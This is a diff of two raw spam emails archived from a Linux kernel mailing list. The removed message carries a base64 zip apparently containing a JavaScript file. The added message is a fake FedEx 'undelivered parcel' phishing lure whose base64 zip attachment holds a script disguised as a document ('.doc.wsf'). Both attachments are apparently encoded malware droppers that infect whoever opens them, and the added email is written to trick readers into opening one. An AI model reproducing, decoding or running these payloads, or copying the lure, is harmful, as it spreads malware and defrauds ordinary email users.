@@ -1,71 +1,77 @@
-From: <angers@pythagorejiujitsu.com>
-Subject: (unknown)
-Date: Mon, 12 Dec 2016 03:36:55 -0000
-Message-ID: <148151381557.16775.2212459193305259032@suntex.com.tw>
+From: "FedEx Parcels Delivery" <ross.moser@bli1soft.com>
+Subject: Courier was not able to deliver your parcel (ID000271965, FedEx)
+Date: Sun, 11 Dec 2016 22:08:47 -0700
+Message-ID: <0299c75bc6fdce9af492d09f7f172ded@bli1soft.com>
+Reply-To: "FedEx Parcels Delivery" <ross.moser@bli1soft.com>
 Mime-Version: 1.0
-Content-Type: application/zip; name="EMAIL_82854453_platform-driver-x86.zip"
-Content-Transfer-Encoding: base64
+Content-Type: multipart/mixed;
+        boundary="b1_62f253bccee46b55ac9a81f6e2721ead"
+Content-Transfer-Encoding: 8bit
 Return-path: <platform-driver-x86-owner@vger.kernel.org>
-Received: from suntex.com.tw ([118.163.18.41]:34965 "HELO suntex.com.tw"
-        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
-        id S1751721AbcLLDhD (ORCPT
+Received: from gproxy6-pub.mail.unifiedlayer.com ([67.222.39.168]:41377 "HELO
+        gproxy6-pub.mail.unifiedlayer.com" rhost-flags-OK-OK-OK-OK)
+        by vger.kernel.org with SMTP id S1750710AbcLLFIx (ORCPT
         <rfc822;platform-driver-x86@vger.kernel.org>);
-        Sun, 11 Dec 2016 22:37:03 -0500
-Subject: 
-Content-Disposition: attachment
+        Mon, 12 Dec 2016 00:08:53 -0500
+Received: from blisoft1 by rsj34.rhostjh.com with local (Exim 4.86_1)
+        (envelope-from <blisoft1@rsj34.rhostjh.com>)
+        id 1cGIr2-0003Oz-09
+        for platform-driver-x86@vger.kernel.org; Sun, 11 Dec 2016 22:08:47 -0700
 Sender: platform-driver-x86-owner@vger.kernel.org
 List-ID: <platform-driver-x86.vger.kernel.org>
 To: platform-driver-x86@vger.kernel.org
 
-UEsDBAoAAgAAAMFLjEkPnyqu3goAAN4KAAAMABwAMzQ2Ml9aSVAuemlwVVQJAAO6GU5YuhlOWHV4
-CwABBAAAAAAEAAAAAFBLAwQUAAIACADBS4xJH6XGXjoKAADSGwAABwAcADM0NjIuanNVVAkAA7oZ
-Tli6GU5YdXgLAAEEAAAAAAQAAAAAvVlbj922EX6Of8VBXs4uEqw3DpoCMdIiSbPpQxwXXQMxcHoe
-KImSqBt1oySq6H8v50Lq0IH96AVWgEbkcK7fDOcsYjytYsjV6YfTl0klv3yxOEo2qmFUCxLlQ0NE
-m9q6tkhiyqJzs2igPD78SiS5qUysM9D+GBVvrFQtSyCpfiZSt8vC4qpnQRST6XIUQBm7E+/LZrOb
-CWgps9KZnUkqeh8T0Wa6RxlS5m2qUve2SIFWC03EulD9hssWv7XXo+iQ2U8PrHatlxVleLxnkp7M
-mCHpj+eUte5lX9l+BeJsiTZNqi1VirJ2vEz0EiUd6V21ptuRk2zfEqmV+WKL1QAx1yVbsE71iGZ+
-ua4svCVX/Mqi951Ka1HVN6elohlMh2ZoeZMZR9zVa17TlHKuUKafGzZLN6gEKb/98x2L2bV2R0P1
-vxNFNKveczUA7fzz92zkVA2bXXcgFp139CrGDCgZvSelmG2tbsRsV5upGRXWPWsjneHwvO9fsuUG
-mTjXAM20YZEcd7HkQBQcfiZXU40W1U3mjSdHIEySD1SJXdArP/6DfTzYrDFNilK9YsN0zgqziNzQ
-5aqzJa56YmPJLJcdrnrJodCpLENl7MTB14gCCc/8PukBfdlJ9uXY6ZJkvNvZbC7IN4yL+YmDrut0
-35udiIY5yR2lmUfjXb4n6KhR9eypUaSYVPkP37D61SIKibSTypm2qqRDIbPWO64wC1LGkBw2MwVQ
-1gfWZCiNOxplevP8ngVNcjkYMvhPrEwvCpugPrzRNqmoZdWgEL94v9SZJR/4MDCzTTuMRcERvC2i
-0RjkD08saL3ZHO1pkicfryrDXV7jRuDhzynnXS+WQjcmChMXJaVdbs+q5CK3Clm/TSrWWLS4zXOq
-VpUiodA185nl6tSjbV6RbjWUQLkP1HKQ/aJatMDs1S3ViIRRsJ02VcrOkjHZ5atqMd4eFK9xCyax
-oeSSUbIodGExoJrfGUtlMukFN77lqNf7bFuTTQRIE4sli9Fu5ISXvHUrTb6JiaCy89YZOpnqDbO0
-YdmWWmyEJeOhUT7YngoEH9HvNs0tRfeJzShyW22o5/1r1mHV3a7mBGh/O7Ejy14Odscz5cQwK/vE
-THgq/DPaD2KazC08mnoUC4HMu39xPOth1pSZvM+BtVoLU6IPugfOINO6MKxIz2cfGduARz6y+Fkp
-ulKVmB3/llPAosQQuPM2VS+2Rs3dq6+gvXKyFrjVlTKizp3dM7T3/QOfmReibiwi4FyefOmjPJZH
-nSO3/8f9nTkeGW08as6ytRUGQtn/3ZNq1WLcGc93kmUSQU1XyXpx0YIKzSzT4Er7PlAVZxMWq86c
-oGguziw11ppMX85ezlVtqp2ipBwqtei9JX1Y2NK6aoj4ojaORj3rsTAN2fWODes6hY06hXsfUjJR
-XAjGO4/VcloU7nzzG8P8qvae0mlmRFfzLsoObS+7gs+sZjMqLDTSx2c1mdrsaFqPRHaT6FzhE1qv
-dsPiV2uWKh8l1faZm4lFJg46CMBCl6MzXTkrohF9K8TY+2SYkm56X3DbO5Y81U2hCfgm+Zpoe+2w
-Hs3MNUzMpUwzal5Y6m4yadSJuZrWmHSIPCFrm5EBvDmdLQnnf/2F+4RWEEbIjffseiLO3pBzqzoC
-9PmdL3Sdwbbp5Etf6SKtQZ9kDx7O7DSqKhW3tcH21lUa9ObD+ze8sFPO0i5UHh3ZldfTj+msFvne
-wbdLkbuzizWnpJPGFQ+XzK5Cu74Lv53vX79wDr67wK4n07l9uru7nM3569O5XdyTk9e9pt35enl1
-PX11upw1fFfugXp4MjcP7tME3xO3/pHWF6sjsH2vl2+ICLRz4R6EZe4lO06w8HGq4SncA5qH6+Vb
-+jaAYL6WBnZlDovH3T25bQrMsh5EhTKD7PwWzBVH0YegEhZyQxc4kyzugYHtuVKSui91feyHpXQX
-CLvRVq1XBDqcoAgSsHVjKVguCLpYLnCI7z7dFxvWAvSxUrw0dUsJSB1dhoVnMAw2DY5cjgc9Bbtx
-a+CJvkiy0Oc8vfEluOxcwaMHo1AR8zpxm+U+DriiPzYCJ+r5Ipl86+9WN2Sq8LlFl2r/YKgM5ssx
-gtpDFOwS/GdGTPfNHDKsKfoSttAVB4xxRN3qjwrFH6UK3yE8/I0wchnDJxjmJhrGxbudy5hnxFUe
-5A6rGc0jZ/r2Nw4GdEkBIUVXxSAeRAk0xxghkfcZypEWW6Tg3ICGJY54+MBdCwtFx1CZhKj4IO4Z
-073LpuTwJPDCbhBxw5MZulGgINX93b3ngLJmRD3998UXaWFWWRqAublU08UlPcbiDLmJ19MYoWA/
-3g34VPrGfTmn0eP1+vrFF6IWbSn7XnznePtjLhds7Q5rMhvvXYhwKH4IY14nbp8BMOP0PUMwQOsC
-kEFId/VQi48eopJbhBDjI5yBUwNMqchDWGg8ha4I3nLrGg6nRs5n8nwjFciP97bAFVSk23kElAj1
-56Hz2YFjEi+iHzy4b9vko845zFlVl1Brku3xMxuVqj2QurAcrjDRUdTFxZlVBmeAcNi1BE+A4thX
-RPiLZJoHBVICDGoUDBsakArMoQadLbKe7ee2xw1rCAK+v0aanZfee5cbxqhK0WOBCOUOJNqNw5Og
-/+A58fUDwm4+eyvINtWr2f76uW0A+uEMJIp2uiAy+BCdx2EhY/pzXGBVKEqAOzDmCLZQvi/CMUIA
-I+ErJt22OYC8OVax2784axwYdLnAnAtKzxyODTeRWOEcpAud4q3xWMkavQGFjYeIUTHzwyS/nGc9
-2O+EM0BXf8PxvYyNoQhGfAEyAqyB3mHKxJlGWjubJ4PIvv1AbTIgMOTLbBC2AqdSHx0VFbxtAvR8
-AFbAgwZ4kRdotBLXOe2THkeq4MvrHcho69ROrZ5bC2IeyevE7A+ggN08ywthADDoJ5NsELw2hJLz
-NZsfWdBFEYI1OTqNOWRjqdKo/FLrBRhD81FPp0FVhGc8OIi9Cefi/CaOk6lEq9PA2FPxnhj3CxBO
-PC4Jezvo02iYFpcSP1mIO9GByjo8QE26mnvj4eQuHBkMhVLD/MFH0Me9A5PP2w7oRu8jLHFAe/ja
-g5JDIp5ph84D2zuc0QUYuLoTXXeKiAJDN9DMMWlFJ0r93YfBAseFUYk3As6k4+ITcIVmicftBZsp
-zLpqx2rDsxMUH5qXspS7KV9FiArTP7dj98nAkQcc8erLQEUPGXdyeO2OkoRGa5EbYcISFLj+ySOH
-Rc/ZBtDHA0KEzcAb2hv/iwFlyv2nOGHU0+8q8f2qgKTww8WANNc7dsmnmNIPMN4SB87T7yTQ99zc
-YRbIEppBRP3/OVTP8wiVn8ckAREg7nh0SGp62P/q5KHwUzLS7xXek83NfQbuKjgt/Zj1Qg/G6IpT
-Ly82/yxxtMIOuVsMmSbH3hl+SnFvx9WfxhRe1+IcYwvugnkIZw8bJwM388D2KEwZ9hrwQwLExBK3
-VDym9EU4VOc/2+2jEPG//wNQSwECHgMUAAIACADBS4xJH6XGXjoKAADSGwAABwAYAAAAAAABAAAA
-pIEAAAAAMzQ2Mi5qc1VUBQADuhlOWHV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE0AAAB7CgAA
-AABQSwECHgMKAAIAAADBS4xJD58qrt4KAADeCgAADAAYAAAAAAAAAAAApIEAAAAAMzQ2Ml9aSVAu
-emlwVVQFAAO6GU5YdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAABAAEAUgAAACQLAAAAAA==
+--b1_62f253bccee46b55ac9a81f6e2721ead
+Content-Type: text/plain; charset=us-ascii
+
+Dear Customer,
+
+We can not deliver your parcel arrived at December 11.
+
+Please check the attachment for details!
+
+With appreciation,
+Ross Moser,
+Senior Office Manager.
+
+
+--b1_62f253bccee46b55ac9a81f6e2721ead
+Content-Type: application/zip; name="Undelivered-Package-000271965.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Undelivered-Package-000271965.zip
+
+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
+
+
+--b1_62f253bccee46b55ac9a81f6e2721ead--
